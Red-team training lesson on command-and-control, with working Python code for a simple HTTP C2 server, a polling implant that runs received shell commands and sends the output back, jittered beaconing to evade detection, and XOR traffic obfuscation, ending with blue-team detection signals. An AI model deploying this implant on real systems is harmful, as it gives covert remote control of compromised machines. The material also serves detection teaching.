# Day 3: Command & Control (C2) Concepts

## The Core Idea
C2 is how an attacker communicates with compromised systems.
Understanding C2 architecture is essential for both building
red team tools and detecting/defending against them.

## C2 Architecture
```
Attacker                      Target Network
┌──────────┐                 ┌──────────┐
│ C2 Server│ ◄──────────────►│ Implant  │
│ (Python) │   HTTP/HTTPS    │ (Agent)  │
└──────────┘   DNS/ICMP      └──────────┘
               WebSocket
               Custom Proto
```

## Simple HTTP C2 Server
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class C2Handler(BaseHTTPRequestHandler):
    commands = []
    results = []

    def do_GET(self):
        """Agent checks in and gets commands."""
        if self.path == "/tasks":
            cmd = self.commands.pop(0) if self.commands else ""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({"cmd": cmd}).encode())

    def do_POST(self):
        """Agent sends back results."""
        if self.path == "/results":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length))
            self.results.append(data)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # suppress default logging

# server = HTTPServer(("0.0.0.0", 8080), C2Handler)
# server.serve_forever()
```

## Simple HTTP Agent (Implant)
```python
import requests
import subprocess
import time
import platform

class Agent:
    def __init__(self, c2_url, interval=30):
        self.c2_url = c2_url
        self.interval = interval
        self.hostname = platform.node()

    def check_in(self):
        """Poll the C2 for commands."""
        try:
            r = requests.get(f"{self.c2_url}/tasks", timeout=10)
            data = r.json()
            return data.get("cmd", "")
        except:
            return ""

    def execute(self, command):
        """Run a command and return output."""
        try:
            output = subprocess.check_output(
                command, shell=True,
                stderr=subprocess.STDOUT, timeout=30
            )
            return output.decode(errors="ignore")
        except Exception as e:
            return f"Error: {e}"

    def send_results(self, command, output):
        """Send results back to C2."""
        try:
            requests.post(f"{self.c2_url}/results", json={
                "host": self.hostname,
                "cmd": command,
                "output": output
            }, timeout=10)
        except:
            pass

    def run(self):
        """Main loop — check in, execute, report."""
        while True:
            cmd = self.check_in()
            if cmd:
                if cmd == "exit":
                    break
                output = self.execute(cmd)
                self.send_results(cmd, output)
            time.sleep(self.interval)
```

## Beaconing Patterns
```python
import random
import time

def jittered_sleep(base_seconds, jitter_pct=0.2):
    """Sleep with random jitter to avoid detection patterns."""
    jitter = base_seconds * jitter_pct
    actual = base_seconds + random.uniform(-jitter, jitter)
    time.sleep(max(1, actual))

# Regular beaconing (easy to detect):
# time.sleep(60)  # exactly 60s every time

# Jittered (harder to detect):
# jittered_sleep(60, 0.3)  # 42-78 seconds, random each time
```

## Encrypted Communications
```python
import base64
import hashlib
import os

def derive_key(password, salt=None):
    """Derive an encryption key from a password."""
    if salt is None:
        salt = os.urandom(16)
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return key, salt

def xor_crypt(data, key):
    """Simple XOR — use AES in real implementations."""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Real C2 frameworks use AES-256 or ChaCha20
# This is simplified for learning
```

## Detection — The Blue Team Perspective
```
How to DETECT C2 traffic:
1. Regular beaconing intervals → statistical analysis
2. Unusual DNS queries (long subdomains, high volume)
3. HTTP to rare/new domains
4. Encrypted traffic to non-standard ports
5. Process spawning cmd.exe/powershell unexpectedly
6. Unusual parent-child process relationships

Understanding C2 helps you write better detection rules.
```
